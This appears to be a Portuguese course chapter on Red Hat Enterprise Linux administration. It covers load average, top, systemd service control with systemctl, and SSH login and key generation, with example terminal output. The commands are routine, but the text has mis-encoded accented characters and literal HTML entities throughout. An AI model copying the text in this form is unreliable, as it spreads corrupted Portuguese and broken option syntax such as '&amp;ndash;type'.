O comando uptime √© uma maneira de exibir a m√©dia de carga atual. Ele imprime a hora atual, h√° quanto tempo a m√°quina est√° ativa, quantas sess√µes de usu√°rio est√£o sendo executadas e a m√©dia de carga atual.
[user@host ~]$ uptime 15:29:03 up 14 min, 2 users, load average: 2.92, 4.48, 5.20
Os tr√™s valores para a m√©dia da carga representam a carga ao longo dos √∫ltimos 1, 5 e 15 minutos. Uma olhada r√°pida indica se a carga do sistema parece estar aumentando ou diminuindo.
Se a contribui√ß√£o principal para a carga m√©dia for um processo aguardando a CPU, voc√™ pode calcular o valor da carga aproximado por CPU para determinar se o sistema est√° enfrentando esperas significativas.
O comando lscpu pode ajudar a determinar quantas CPUs um sistema possui.
No exemplo a seguir, o sistema √© um sistema dual-core de soquete √∫nico com dois hyperthreads por n√∫cleo. Basicamente, o Linux tratar√° isso como um sistema de quatro CPUs para fins de agendamento.
[user@host ~]$ lscpu Architecture: x86_64 CPU op-mode(s): 32-bit, 64-bit Byte Order: Little Endian CPU(s): 4 On-line CPU(s) list: 0-3 Thread(s) per core: 2 Core(s) per socket: 2 Socket(s): 1 NUMA node(s): 1 &amp;hellip;output omitted&amp;hellip;
Por um momento, imagine que a √∫nica contribui√ß√£o para o n√∫mero da carga √© os processos que precisam de tempo de CPU. Em seguida, voc√™ pode dividir os valores de m√©dia de carga exibidos pelo n√∫mero de CPUs l√≥gicas no sistema. Um valor abaixo de 1 indica o uso satisfat√≥rio de recursos e tempos de espera m√≠nimos. Um valor acima de 1 indica satura√ß√£o de recursos e certo atraso de processamento.
From lscpu, the system has four logical CPUs, so divide by 4: load average: 2.92, 4.48, 5.20 divide by number of logical CPUs: 4 4 4 &amp;mdash;- &amp;mdash;- &amp;mdash;- per-CPU load average: 0.73 1.12 1.30 This system&amp;rsquo;s load average appears to be decreasing. With a load average of 2.92 on four CPUs, all CPUs were in use ~73% of the time. During the last 5 minutes, the system was overloaded by ~12%. During the last 15 minutes, the system was overloaded by ~30%. Uma fila de CPU inativa tem um n√∫mero de carga de 0. Cada processo aguardando uma CPU adiciona uma contagem de 1 ao n√∫mero da carga. Se um processo estiver sendo executado em uma CPU, o n√∫mero de carga ser√° um, o recurso (a CPU) estar√° em uso, mas n√£o haver√° solicita√ß√µes em espera. Se esse processo for executado por um minuto inteiro, sua contribui√ß√£o para a m√©dia de carga de um minuto ser√° 1.
Por√©m, os processos em hiberna√ß√£o ininterrupta para E/S cr√≠tica devido ao fato de o disco ou a rede estarem ocupados tamb√©m s√£o inclu√≠dos na contagem e aumentam a m√©dia de carga. Embora n√£o seja uma indica√ß√£o do uso da CPU, esses processos s√£o adicionados √† contagem de filas porque est√£o aguardando recursos e n√£o podem ser executados em uma CPU at√© que os obtenham. Esse ainda √© carregamento do sistema devido a limita√ß√µes de recursos que est√£o fazendo com que os processos n√£o sejam executados.
At√© a satura√ß√£o dos recursos, a m√©dia de carga permanece abaixo de 1, j√° que as tarefas raramente s√£o encontradas na fila de espera. A m√©dia de carga aumenta somente quando a satura√ß√£o de recursos faz com que as solicita√ß√µes permane√ßam na fila e sejam contadas pela rotina de c√°lculo de carga. Quando o uso de recursos se aproxima dos 100%, cada solicita√ß√£o adicional come√ßa a ter tempo de espera de servi√ßo.
V√°rias ferramentas adicionais informam a m√©dia de carga, incluindo w e top. Monitoramento de processos em tempo real
O programa top √© uma visualiza√ß√£o din√¢mica dos processos do sistema, exibindo um cabe√ßalho de resumo seguido de uma lista de processos ou de threads semelhante √†s informa√ß√µes de ps. Diferentemente da sa√≠da est√°tica de ps, top √© atualizado continuamente em um intervalo configur√°vel, fornecendo capacidades de reordenamento de colunas, classifica√ß√£o e realce. As configura√ß√µes do usu√°rio podem ser salvas e tornadas persistentes.
As colunas de sa√≠da padr√£o s√£o reconhec√≠veis por outras ferramentas de recursos:
A ID de processo (PID). O nome de usu√°rio (USER) √© o propriet√°rio do processo. A mem√≥ria virtual (VIRT) √© toda a mem√≥ria que o processo est√° usando, incluindo as defini√ß√µes residentes, as bibliotecas compartilhadas e as p√°ginas de mem√≥ria mapeadas ou trocadas. (Chamados de VSZ no comando ps). A mem√≥ria residente (RES) √© a mem√≥ria f√≠sica usada pelo processo, incluindo objetos residentes compartilhados (Chamados de RSS no comando ps). O estado de processo (S) √© exibido como: D = Hiberna√ß√£o ininterrupt√≠vel R = Em execu√ß√£o ou Execut√°vel S = Em hiberna√ß√£o T = Interrompido ou Rastre√°vel Z = Zumbi O tempo de CPU (TIME) √© o total do tempo de processamento desde que o processo foi iniciado. Pode ser comutado para incluir o tempo cumulativo de todos os filhos anteriores. O nome de comando do processo (COMMAND). Tabela 8.3. Pressionamentos de tecla fundamentais em top
process_fundamentals_a2.png
Cap√≠tulo 9. Controle de servi√ßos e daemons Identifica√ß√£o de processos do sistema iniciados automaticamente Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de listar daemons do sistema e servi√ßos de rede iniciados pelo servi√ßo systemd e pelas unidades de soquete. Introdu√ß√£o ao systemd
O daemon systemd gerencia a inicializa√ß√£o para Linux, incluindo a inicializa√ß√£o de servi√ßos e o gerenciamento de servi√ßos em geral. Ele ativa os recursos do sistema, daemons do servidor e outros processos, tanto no momento da inicializa√ß√£o quanto em um sistema em execu√ß√£o.
Daemons s√£o processos que esperam ou s√£o executados em segundo plano realizando v√°rias tarefas. Em geral, os daemons s√£o iniciados automaticamente no momento do boot e continuam em execu√ß√£o at√© o desligamento ou at√© serem interrompidos manualmente. Por conven√ß√£o, os nomes de muitos programas daemon terminam com a letra d.
Um servi√ßo no sentido do systemd muitas vezes se refere a um ou mais daemons, mas iniciar ou parar um servi√ßo pode fazer uma √∫nica altera√ß√£o no estado do sistema, que n√£o envolve deixar um processo daemon em execu√ß√£o posteriormente (chamado oneshot).
No Red Hat Enterprise Linux, o primeiro processo que inicia (PID 1) √© o systemd. Alguns dos recursos fornecidos pelo systemd incluem:
Recursos de paraleliza√ß√£o (que iniciam v√°rios servi√ßos de uma s√≥ vez), que aumentam a velocidade de boot de um sistema. Inicializa√ß√£o de daemons conforme a necessidade sem exigir um servi√ßo separado. Gerenciamento autom√°tico de depend√™ncia de servi√ßo, que pode evitar limites de tempo longos. Por exemplo, um servi√ßo dependente de rede n√£o tentar√° iniciar at√© que a rede esteja dispon√≠vel. Um m√©todo de rastrear processos relacionados em conjunto usando os grupos de controle do Linux. Descri√ß√£o das unidades de servi√ßo
O systemd usa unidades para gerenciar diferentes tipos de objetos. Alguns tipos comuns de unidades est√£o listados abaixo:
As unidades de servi√ßo t√™m uma extens√£o .service e representam os servi√ßos do sistema. Esse tipo de unidade √© usado para iniciar daemons acessados frequentemente, como um servidor web. Unidades de soquete t√™m uma extens√£o .socket e representam soquetes de comunica√ß√£o entre processos (IPC) que o systemd monitora. Se um cliente se conecta ao soquete, o systemd iniciar√° um daemon e passar√° a conex√£o para ele. Unidades de soquete s√£o usadas para atrasar o in√≠cio de um servi√ßo no momento do boot e para iniciar sob demanda servi√ßos usados com menos frequ√™ncia. Unidades de caminho t√™m uma extens√£o .path e s√£o usadas para atrasar a ativa√ß√£o de um servi√ßo at√© que ocorra uma altera√ß√£o espec√≠fica do sistema de arquivos. Elas s√£o frequentemente usadas para servi√ßos que usam diret√≥rios de spool, tais como um sistema de impress√£o. O comando systemctl √© usado para gerenciar unidades. Por exemplo, exiba os tipos de unidade dispon√≠veis com o comando systemctl -t help. Importante
Ao usar systemctl, voc√™ pode abreviar nomes de unidades, processar entradas de √°rvores e descri√ß√µes de unidades. Unidades de servi√ßo de listagem
Voc√™ usa o comando systemctl para explorar o estado atual do sistema. Por exemplo, o comando a seguir lista todas as unidades de servi√ßo atualmente carregadas, paginando a sa√≠da usando less.
[root@host ~]# systemctl list-units &amp;ndash;type=service UNIT LOAD ACTIVE SUB DESCRIPTION atd.service loaded active running Job spooling tools auditd.service loaded active running Security Auditing Service chronyd.service loaded active running NTP client/server crond.service loaded active running Command Scheduler dbus.service loaded active running D-Bus System Message Bus &amp;hellip;output omitted&amp;hellip;
A sa√≠da acima limita o tipo de unidade listada √†s unidades de servi√ßo com a op√ß√£o &amp;ndash;type=service. A sa√≠da possui as seguintes colunas:
Colunas na sa√≠da de comando systemctl list-units
UNIT
O nome da unidade de servi√ßo. LOAD
Se o systemd analisou adequadamente a configura√ß√£o da unidade e carregou a unidade na mem√≥ria. ACTIVE
Estado de ativa√ß√£o de alto n√≠vel da unidade. Essa informa√ß√£o indica se a unidade foi iniciada com √™xito ou n√£o. SUB
Estado de ativa√ß√£o de baixo n√≠vel da unidade. Esta informa√ß√£o indica informa√ß√µes mais detalhadas sobre a unidade. A informa√ß√£o varia com base no tipo de unidade, estado e de que maneira a unidade √© executada. DESCRIPTION
A breve descri√ß√£o da unidade. Por padr√£o, o comando systemctl list-units &amp;ndash;type=service lista apenas as unidades de servi√ßo com estados de ativa√ß√£o ativo. A op√ß√£o &amp;ndash;all lista todas as unidades de servi√ßo, independentemente dos estados de ativa√ß√£o. Use a op√ß√£o &amp;ndash;state= para filtrar pelos valores nos campos LOAD , ACTIVE ou SUB.
[root@host ~]# systemctl list-units &amp;ndash;type=service &amp;ndash;all UNIT LOAD ACTIVE SUB DESCRIPTION atd.service loaded active running Job spooling tools auditd.service loaded active running Security Auditing &amp;hellip; auth-rpcgss-module.service loaded inactive dead Kernel Module &amp;hellip; chronyd.service loaded active running NTP client/server cpupower.service loaded inactive dead Configure CPU power &amp;hellip; crond.service loaded active running Command Scheduler dbus.service loaded active running D-Bus System Message Bus ‚óè display-manager.service not-found inactive dead display-manager.service &amp;hellip;output omitted&amp;hellip;
O comando systemctl sem nenhum argumento lista as unidades que est√£o carregadas e ativas.
[root@host ~]# systemctl UNIT LOAD ACTIVE SUB DESCRIPTION proc-sys-fs-binfmt_misc.automount loaded active waiting Arbitrary&amp;hellip; sys-devices-&amp;hellip;.device loaded active plugged Virtio network&amp;hellip; sys-subsystem-net-devices-ens3.deviceloaded active plugged Virtio network&amp;hellip; &amp;hellip; -.mount loaded active mounted Root Mount boot.mount loaded active mounted /boot &amp;hellip; systemd-ask-password-plymouth.path loaded active waiting Forward Password&amp;hellip; systemd-ask-password-wall.path loaded active waiting Forward Password&amp;hellip; init.scope loaded active running System and Servi&amp;hellip; session-1.scope loaded active running Session 1 of&amp;hellip; atd.service loaded active running Job spooling tools auditd.service loaded active running Security Auditing&amp;hellip; chronyd.service loaded active running NTP client/server crond.service loaded active running Command Scheduler &amp;hellip;output omitted&amp;hellip;
O comando systemctl list-units exibe as unidades que o servi√ßo systemd tenta analisar e carregar na mem√≥ria; ele n√£o exibe servi√ßos instalados, mas n√£o habilitados. Para ver o estado de todos os arquivos da unidade instalados, use o comando systemctl list-unit-files. Por exemplo:
[root@host ~]# systemctl list-unit-files &amp;ndash;type=service UNIT FILE STATE arp-ethers.service disabled atd.service enabled auditd.service enabled auth-rpcgss-module.service static autovt@.service enabled blk-availability.service disabled &amp;hellip;output omitted&amp;hellip;
Na sa√≠da do comando systemctl list-units-files, entradas v√°lidas para o campo STATE s√£o ativadas, desativadas, est√°ticas e mascaradas. Exibi√ß√£o de estados de servi√ßo
Visualize o status de uma unidade espec√≠fica com systemctl status name.type. Se o tipo de unidade n√£o for fornecido, systemctl mostrar√° o status de uma unidade de servi√ßo, caso ela exista.
[root@host ~]# systemctl status sshd.service ‚óè sshd.service - OpenSSH server daemon Loaded: loaded (/usr/lib/systemd/system/sshd.service; enabled; vendor preset: enabled) Active: active (running) since Thu 2019-02-14 12:07:45 IST; 7h ago Main PID: 1073 (sshd) CGroup: /system.slice/sshd.service ‚îî‚îÄ1073 /usr/sbin/sshd -D &amp;hellip;
Feb 14 11:51:39 host.example.com systemd[1]: Started OpenSSH server daemon. Feb 14 11:51:39 host.example.com sshd[1073]: Could not load host key: /et&amp;hellip;y Feb 14 11:51:39 host.example.com sshd[1073]: Server listening on 0.0.0.0 &amp;hellip;. Feb 14 11:51:39 host.example.com sshd[1073]: Server listening on :: port 22. Feb 14 11:53:21 host.example.com sshd[1270]: error: Could not load host k&amp;hellip;y Feb 14 11:53:22 host.example.com sshd[1270]: Accepted password for root f&amp;hellip;2 &amp;hellip;output omitted&amp;hellip;
Esse comando exibe o status atual do servi√ßo. Os significados dos campos s√£o:
Tabela 9.1. Informa√ß√µes da unidade de servi√ßo
daemons_services_a1.png
V√°rias palavras-chave que indicam o estado do servi√ßo podem ser encontradas na sa√≠da de status:
Tabela 9.2. Estados de servi√ßo na sa√≠da de systemctl
daemons_services_a2.png
Nota
O comando systemctl status NAME substitui o comando service NAME status usado no Red Hat Enterprise Linux 6 e vers√µes anteriores. Verifica√ß√£o do status de um servi√ßo
O comando systemctl oferece m√©todos para verificar os estados espec√≠ficos de um servi√ßo. Por exemplo, use o seguinte comando para verificar se a unidade de servi√ßo est√° active (running) no momento:
[root@host ~]# systemctl is-active sshd.service active
O comando retorna o estado da unidade de servi√ßo, que geralmente √© active ou inactive.
Execute o seguinte comando para verificar se uma unidade de servi√ßo est√° habilitada para iniciar automaticamente durante a inicializa√ß√£o do sistema:
[root@host ~]# systemctl is-enabled sshd.service enabled
O comando retorna se a unidade de servi√ßo estiver habilitada para iniciar no momento da inicializa√ß√£o, que geralmente est√° enabled ou disabled.
Para verificar se a unidade falhou durante a inicializa√ß√£o, execute o seguinte comando:
[root@host ~]# systemctl is-failed sshd.service active
O comando retorna active se estiver funcionando corretamente ou failed se tiver ocorrido um erro durante a inicializa√ß√£o. No caso de a unidade ser interrompida, ele retorna unknown ou inactive.
Para listar todas as unidades com falha, execute o comando systemctl &amp;ndash;failed &amp;ndash;type=service.
Controle de servi√ßos do sistema Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de controlar daemons do sistema e servi√ßos de rede usando o systemctl. In√≠cio e encerramento de servi√ßos
Os servi√ßos precisam ser interrompidos ou iniciados manualmente por v√°rios motivos: talvez o servi√ßo precise ser atualizado; o arquivo de configura√ß√£o pode precisar de altera√ß√µes; um servi√ßo talvez precise ser desinstalado; ou um administrador pode iniciar manualmente um servi√ßo usado com pouca frequ√™ncia.
Para iniciar um servi√ßo, primeiro verifique se ele n√£o est√° sendo executado com o systemctl status. Depois, use o comando systemctl start como usu√°rio root (usando sudo se necess√°rio). O exemplo abaixo mostra como iniciar o servi√ßo sshd.service:
[root@host ~]# systemctl start sshd.service
O servi√ßo systemd procura arquivos .servive para gerenciamento de servi√ßos em comandos na aus√™ncia do tipo de servi√ßo com o nome do servi√ßo. Assim, o comando acima pode ser executado como:
[root@host ~]# systemctl start sshd
Para interromper um servi√ßo em execu√ß√£o no momento, use o argumento stop com o comando systemctl. O exemplo abaixo mostra como encerrar o servi√ßo sshd.service:
[root@host ~]# systemctl stop sshd.service
Rein√≠cio e recarregamento de servi√ßos
Durante o rein√≠cio de um servi√ßo em execu√ß√£o, o servi√ßo √© interrompido e, depois, iniciado. Na reinicializa√ß√£o do servi√ßo, a ID do processo √© alterada e uma nova ID de processo √© associada durante a inicializa√ß√£o. Para reiniciar um servi√ßo em execu√ß√£o, use o argumento restart com o comando systemctl. O exemplo abaixo mostra como reiniciar o servi√ßo sshd.service:
[root@host ~]# systemctl restart sshd.service
Alguns servi√ßos t√™m a capacidade de recarregar seus arquivos de configura√ß√£o sem exigir uma reinicializa√ß√£o. Este processo √© chamado de recarregamento de servi√ßo. Recarregar um servi√ßo n√£o altera a ID do processo associado a v√°rios processos de servi√ßo. Para recarregar um servi√ßo em execu√ß√£o, use o argumento reload com o comando systemctl. O exemplo abaixo mostra como recarregar o servi√ßo sshd.service depois de alterar a configura√ß√£o:
[root@host ~]# systemctl reload sshd.service
Caso voc√™ n√£o tenha certeza se o servi√ßo tem a funcionalidade de recarregar as altera√ß√µes do arquivo de configura√ß√£o, use o reload-or-restart argumento com o comando systemctl. O comando recarrega as altera√ß√µes de configura√ß√£o se a funcionalidade de recarregamento estiver dispon√≠vel. Caso contr√°rio, o comando reinicia o servi√ßo para implementar as novas altera√ß√µes de configura√ß√£o:
[root@host ~]# systemctl reload-or-restart sshd.service
Listagem de depend√™ncias de unidade
Alguns servi√ßos exigem que outros servi√ßos sejam executados primeiro, criando depend√™ncias nos outros servi√ßos. Outros servi√ßos n√£o s√£o iniciados no momento da inicializa√ß√£o, mas apenas sob demanda. Em ambos os casos, systemd e systemctl iniciam servi√ßos conforme necess√°rio, seja para resolver a depend√™ncia ou para iniciar um servi√ßo usado com pouca frequ√™ncia. Por exemplo, se o servi√ßo de impress√£o do CUPS n√£o estiver em execu√ß√£o e um arquivo for colocado no diret√≥rio de spool de impress√£o, o sistema iniciar√° daemons ou comandos relacionados ao CUPS para satisfazer o pedido de impress√£o.
[root@host ~]# systemctl stop cups.service Warning: Stopping cups, but it can still be activated by: cups.path cups.socket
Para interromper completamente os servi√ßos de impress√£o em um sistema, interrompa todas as tr√™s unidades. A desativa√ß√£o do servi√ßo desabilita as depend√™ncias.
O comando systemctl list-dependencies UNIT exibe um mapeamento de hierarquia de depend√™ncias para iniciar a unidade de servi√ßo. Para listar depend√™ncias reversas (unidades que dependem da unidade especificada), use a op√ß√£o &amp;ndash;reverse com o comando.
[root@host ~]# systemctl list-dependencies sshd.service sshd.service ‚óè ‚îú‚îÄsystem.slice ‚óè ‚îú‚îÄsshd-keygen.target ‚óè ‚îÇ ‚îú‚îÄsshd-keygen@ecdsa.service ‚óè ‚îÇ ‚îú‚îÄsshd-keygen@ed25519.service ‚óè ‚îÇ ‚îî‚îÄsshd-keygen@rsa.service ‚óè ‚îî‚îÄsysinit.target &amp;hellip;output omitted&amp;hellip;
Incluir e remover m√°scaras de servi√ßos
√Äs vezes, um sistema pode ter diferentes servi√ßos instalados que estejam em conflito. Por exemplo, h√° v√°rios m√©todos de gerenciar servidores de e-mail (postfix e sendmail, por exemplo). Mascarar um servi√ßo impede que um administrador inicie acidentalmente um servi√ßo que esteja em conflito com outros. O mascaramento cria um link nos diret√≥rios de configura√ß√£o para o arquivo /dev/null que impede que o servi√ßo seja iniciado.
[root@host ~]# systemctl mask sendmail.service Created symlink /etc/systemd/system/sendmail.service ‚Üí /dev/null.
[root@host ~]# systemctl list-unit-files &amp;ndash;type=service UNIT FILE STATE &amp;hellip;output omitted&amp;hellip; sendmail.service masked &amp;hellip;output omitted&amp;hellip;
A tentativa de iniciar uma unidade de servi√ßo mascarada falha com a seguinte sa√≠da:
[root@host ~]# systemctl start sendmail.service Failed to start sendmail.service: Unit sendmail.service is masked.
Use o comando systemctl unmask para desmascarar a unidade de servi√ßo.
[root@host ~]# systemctl unmask sendmail Removed /etc/systemd/system/sendmail.service.
Importante
Um servi√ßo desativado pode ser iniciado manualmente ou por outros arquivos da unidade, mas n√£o √© iniciado automaticamente na inicializa√ß√£o. Um servi√ßo mascarado n√£o pode ser iniciado manual ou automaticamente. Habilita√ß√£o de servi√ßos para iniciar ou interromper na inicializa√ß√£o
Iniciar um servi√ßo em um sistema em execu√ß√£o n√£o garante que o servi√ßo inicia automaticamente quando o sistema √© reinicializado. Da mesma forma, interromper um servi√ßo em um sistema em execu√ß√£o n√£o evita que ele inicie novamente quando o sistema for reinicializado. A cria√ß√£o de links nos diret√≥rios de configura√ß√£o systemd permitem que o servi√ßo inicie na inicializa√ß√£o. Os comandos systemctl criam e removem esses links.
Para iniciar um servi√ßo na inicializa√ß√£o, use o comando systemctl enable.
[root@root ~]# systemctl enable sshd.service Created symlink /etc/systemd/system/multi-user.target.wants/sshd.service ‚Üí /usr/lib/systemd/system/sshd.service.
O comando acima cria um link simb√≥lico a partir do arquivo da unidade de servi√ßo, geralmente no diret√≥rio /usr/lib/systemd/system, para o local no disco onde systemd procura arquivos, que est√° no diret√≥rio /etc/systemd/system/TARGETNAME.target.wants. Ativar um servi√ßo n√£o inicia o servi√ßo na sess√£o atual. Para iniciar o servi√ßo e permitir que ele inicie automaticamente durante a inicializa√ß√£o, execute ambos os comandos systemctl start e systemctl enable.
Para impedir que o servi√ßo seja iniciado automaticamente, use o comando a seguir, que remove o link simb√≥lico criado durante a ativa√ß√£o de um servi√ßo. Observe que o ato de desabilitar um servi√ßo n√£o o interrompe.
[root@host ~]# systemctl disable sshd.service Removed /etc/systemd/system/multi-user.target.wants/sshd.service.
Para verificar se o servi√ßo est√° ativado ou desativado, use o comando systemctl is-enabled. Sum√°rio de comandos systemctl
Os servi√ßos podem ser iniciados e interrompidos em um sistema em execu√ß√£o e habilitados ou desabilitados para iniciarem automaticamente no momento do boot.
Tabela 9.3. Comandos √∫teis de gerenciamento de servi√ßos
gerenciamento_services.png
Cap√≠tulo 10. Configura√ß√£o e prote√ß√£o do SSH Acesso √† linha de comando remoto com o SSH Objetivos
Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de fazer login em um sistema remoto e executar comandos usando ssh. O que √© o OpenSSH?
O OpenSSH implementa o Secure Shell ou o protocolo SSH em sistemas Red Hat Enterprise Linux. O protocolo SSH permite que os sistemas se comuniquem de maneira criptografada e segura em uma rede insegura.
Voc√™ pode usar o comando ssh para criar uma conex√£o segura com um sistema remoto, autenticar como um usu√°rio espec√≠fico e obter uma sess√£o de shell interativa no sistema remoto como esse usu√°rio. Voc√™ tamb√©m pode usar o comando ssh para executar um comando individual no sistema remoto sem acessar o shell interativo. Exemplos do Secure Shell
O comando ssh a seguir faria o seu login no servidor remoto remotehost usando o mesmo nome de usu√°rio do usu√°rio local atual. Neste exemplo, o sistema remoto solicita a autentica√ß√£o com a senha desse usu√°rio.
[user01@host ~]$ ssh remotehost user01@remotehost&amp;rsquo;s password: redhat &amp;hellip;output omitted&amp;hellip; [user01@remotehost ~]$
Voc√™ pode usar o comando exit para fazer o logout do sistema remoto.
[user01@remotehost ~]$ exit logout Connection to remotehost closed. [user01@host ~]$
O pr√≥ximo comando ssh faria o seu login no servidor remoto remotehost usando o mesmo nome de usu√°rio user02. Novamente, o sistema remoto solicita a autentica√ß√£o com a senha desse usu√°rio.
[user01@host ~]$ ssh user02@remotehost user02@remotehost&amp;rsquo;s password: shadowman &amp;hellip;output omitted&amp;hellip; [user02@remotehost ~]$
Esse comando ssh executaria o comando hostname no sistema remoto remotehost como o usu√°rio user02 sem acessar o shell interativo remoto.
[user01@host ~]$ ssh user02@remotehost hostname user02@remotehost&amp;rsquo;s password: shadowman remotehost.lab.example.com [user01@host ~]$
Observe que o comando anterior exibiu a sa√≠da no terminal do sistema local. Identifica√ß√£o de usu√°rios remotos
O comando w exibe uma lista de usu√°rios atualmente conectados ao computador. Isso √© especialmente √∫til para mostrar quais usu√°rios est√£o conectados por meio de ssh, em quais locais remotos e o que eles est√£o fazendo.
[user01@host ~]$ ssh user01@remotehost user01@remotehost&amp;rsquo;s password: redhat [user01@remotehost ~]$ w 16:13:38 up 36 min, 1 user, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT user02 pts/0 172.25.250.10 16:13 7:30 0.01s 0.01s -bash user01 pts/1 172.25.250.10 16:24 3.00s 0.01s 0.00s w [user02@remotehost ~]$
A sa√≠da precedente mostra que o usu√°rio user02 fez login no sistema no pseudoterminal 0 √†s 16:13 hoje a partir do host com o endere√ßo IP 172.25.250.10, e ficou ocioso em um prompt do shell por sete minutos e trinta segundos. A sa√≠da anterior tamb√©m mostra que o usu√°rio user01 fez login no sistema no pseudoterminal 1 e ficou ocioso desde os √∫ltimos tr√™s segundos ap√≥s a execu√ß√£o do comando w. Chaves do host do SSH
O SSH garante a seguran√ßa da comunica√ß√£o por meio da criptografia de chaves p√∫blicas. Quando um cliente SSH se conecta a um servidor SSH, o servidor envia uma c√≥pia da chave p√∫blica ao cliente antes de o cliente fazer login. Essa chave √© usada para estabelecer a criptografia segura do canal de comunica√ß√£o e para autenticar o servidor para o cliente.
Quando um usu√°rio usa o comando ssh para se conectar a um servidor SSH, o comando verifica se h√° uma c√≥pia da chave p√∫blica desse servidor em seus arquivos hosts locais conhecidos. O administrador do sistema pode o ter pr√©-configurado em /etc/ssh/ssh_known_hosts ou o usu√°rio pode ter um arquivo ~/.ssh/known_hosts em seu diret√≥rio pessoal que cont√©m a chave.
Se o cliente tiver uma c√≥pia da chave, ssh comparar√° a chave dos arquivos hosts conhecidos para esse servidor com aquele que recebeu. Se as chaves n√£o corresponderem, o cliente entender√° que o tr√°fego de rede ao servidor poderia ser interceptado ou que o servidor est√° comprometido e buscar√° a confirma√ß√£o do usu√°rio se deve ou n√£o continuar com a conex√£o. Nota
Defina o par√¢metro StrictHostKeyChecking como sim no arquivo ~/.ssh/config espec√≠fico do usu√°rio ou no /etc/ssh/ssh_config v√°lido para todo o sistema para que o comando ssh sempre anule a conex√£o por SSH se as chaves p√∫blicas n√£o corresponderem.
Se o cliente n√£o tiver uma c√≥pia da chave p√∫blica em seus arquivos de hosts conhecidos, o comando ssh perguntar√° se voc√™ deseja fazer login de qualquer maneira. Se voc√™ fizer isso, uma c√≥pia da chave p√∫blica ser√° salva no arquivo ~/.ssh/known_hosts para que a identidade do servidor possa ser confirmada automaticamente no futuro.
[user01@host ~]$ ssh newhost The authenticity of host &amp;lsquo;remotehost (172.25.250.12)&amp;rsquo; can&amp;rsquo;t be established. ECDSA key fingerprint is SHA256:qaS0PToLrqlCO2XGklA0iY7CaP7aPKimerDoaUkv720. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added &amp;rsquo;newhost,172.25.250.12&amp;rsquo; (ECDSA) to the list of known hosts. user01@newhost&amp;rsquo;s password: redhat &amp;hellip;output omitted&amp;hellip; [user01@newhost ~]$
Gerenciamento de chaves de hosts conhecidos SSH
Se a chave p√∫blica de um servidor for alterada porque a chave foi perdida devido a falha no disco r√≠gido ou substitu√≠da por algum motivo leg√≠timo, voc√™ precisar√° editar os arquivos de hosts conhecidos para garantir que a entrada da chave p√∫blica antiga seja substitu√≠da por uma entrada com a nova chave p√∫blica para fazer login sem erros.
As chaves p√∫blicas s√£o armazenadas no /etc/ssh/ssh_known_hosts e no arquivo ~/.ssh/known_hosts de cada usu√°rio no cliente SSH. Cada chave est√° em uma linha. O primeiro campo √© uma lista de nomes de host e endere√ßos IP que compartilham essa chave p√∫blica. O segundo campo √© o algoritmo de criptografia da chave. O √∫ltimo campo √© a chave em si.
[user01@host ~]$ cat ~/.ssh/known_hosts remotehost,172.25.250.11 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOsEi0e&#43;FlaNT6jul8Ag5Nj&#43;RViZl0yE2w6iYUr&#43;1fPtOIF0EaOgFZ1LXM37VFTxdgFxHS3D5WhnIfb&#43;68zf8&#43;w=
Cada servidor SSH remoto que voc√™ conecta armazena sua chave p√∫blica no diret√≥rio /etc/ssh em arquivos com a extens√£o .pub.
[user01@remotehost ~]$ ls /etc/ssh/*key.pub /etc/ssh/ssh_host_ecdsa_key.pub /etc/ssh/ssh_host_ed25519_key.pub /etc/ssh/ssh_host_rsa_key.pub
Nota
√â uma boa pr√°tica adicionar entradas que correspondam aos arquivos ssh_host_*key.pub do servidor para seu arquivo ~/.ssh/known_hosts ou o arquivo /etc/ssh/ssh_known_hosts de todo o sistema.
Configura√ß√£o da autentica√ß√£o baseada em chaves SSH Objetivos Depois de concluir esta se√ß√£o, voc√™ dever√° ser capaz de configurar uma conta de usu√°rio para usar autentica√ß√£o baseada em chave para fazer login em sistemas remotos com seguran√ßa e sem uma senha. Autentica√ß√£o baseada em chaves SSH
Voc√™ pode configurar um servidor SSH para permitir a autentica√ß√£o sem uma senha usando autentica√ß√£o baseada em chave. Essa √© baseada em um esquema de chave privada-p√∫blica.
Para fazer isso, voc√™ gera um par combinado de arquivos de chaves criptogr√°ficas. Uma √© uma chave privada, a outra √© uma chave p√∫blica correspondente. O arquivo de chave privada √© usado como a credencial de autentica√ß√£o e, como uma senha, deve ser mantido em segredo e protegido. A chave p√∫blica √© copiada para sistemas nos quais o usu√°rio deseja fazer login e √© usada para verificar a chave privada. A chave p√∫blica n√£o precisa ser secreta.
Voc√™ coloca uma c√≥pia da chave p√∫blica em sua conta no servidor. Quando voc√™ tenta fazer login, o servidor SSH pode usar a chave p√∫blica para emitir um desafio que s√≥ pode ser respondido corretamente usando a chave privada. Como resultado, seu cliente ssh pode autenticar automaticamente seu login no servidor com sua c√≥pia exclusiva da chave privada. Isso permite que voc√™ acesse sistemas com seguran√ßa e sem digitar sempre uma senha interativamente.
Gera√ß√£o de chaves SSH
Para criar uma chave privada e uma chave p√∫blica correspondente para autentica√ß√£o, use o comando ssh-keygen. Por padr√£o, as suas chaves privada e p√∫blica s√£o salvas nos arquivos ~/.ssh/id_rsa e ~/.ssh/id_rsa.pub, respectivamente.
[user@host ~]$ ssh-keygen Generating public/private rsa key pair. Enter file in which to save the key (/home/user/.ssh/id_rsa): Enter Created directory &amp;lsquo;/home/user/.ssh&amp;rsquo;. Enter passphrase (empty for no passphrase): Enter Enter same passphrase again: Enter Your identification has been saved in /home/user/.ssh/id_rsa. Your public key has been saved in /home/user/.ssh/id_rsa.pub. The key fingerprint is: SHA256:vxutUNPio3QDCyvkYm1oIx35hmMrHpPKWFdIYu3HV&#43;w user@host.lab.example.com The key&amp;rsquo;s randomart image is: &#43;&amp;mdash;[RSA 2048]&amp;mdash;-&#43; | | | . . | | o o o | | . = o o . | | o &#43; = S E . | | ..O o &#43; * &#43; | |.&#43;% O . &#43; B . | |=*oO . . &#43; * | |&#43;&#43;. . &#43;. | &#43;&amp;mdash;-[SHA256]&amp;mdash;&amp;ndash;&#43;
